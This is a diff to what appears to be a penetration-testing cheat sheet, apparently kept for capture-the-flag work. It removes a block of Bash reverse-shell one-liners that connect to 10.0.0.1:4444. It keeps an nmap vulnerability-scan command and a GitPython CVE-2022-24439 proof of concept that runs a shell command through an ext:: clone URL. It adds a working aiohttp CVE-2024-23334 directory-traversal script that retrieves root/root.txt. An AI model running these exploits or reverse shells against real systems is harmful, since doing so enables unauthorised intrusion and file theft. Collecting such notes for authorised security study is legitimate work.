@@ -45,14 +45,6 @@ sudo nmap -v -sS -Pn --script=vuln --script-args=unsafe=1 <target_ip>
 
 ### [Reverse Shell Cheat Sheet - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
 
-### Bash
-```bash
-bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-/bin/bash -l > /dev/tcp/10.0.0.1/4444 0<&1 2>&1
-bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
-/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
-```
-
 ### Upgrade Shell
 
 ```bash
@@ -274,14 +266,35 @@ netstat -tuln
 
 # CVEs
 
-## CVE-2022-24439 - GitPython RCE
-- Affecting gitpython package, versions [0,3.1.30)
+## CVE-2022-24439 - GitPython [RCE]
+- Affecting gitpython package, versions<3.1.30
+- PoC
 ```python
-# PoC
 from git import Repo
 r = Repo.init('', bare=True)
 r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
 ```
 > https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
 
-
+## CVE-2024-23334 - python-aiohttp [Directory Traversal]
+- Affecting python-aiohttp package, versions<3.9.5-1
+- PoC
+```bash
+#!/bin/bash
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="root/root.txt" # without the first /
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+> https://security.snyk.io/vuln/SNYK-DEBIAN13-PYTHONAIOHTTP-6210121
+> https://github.com/z3rObyte/CVE-2024-23334-PoC
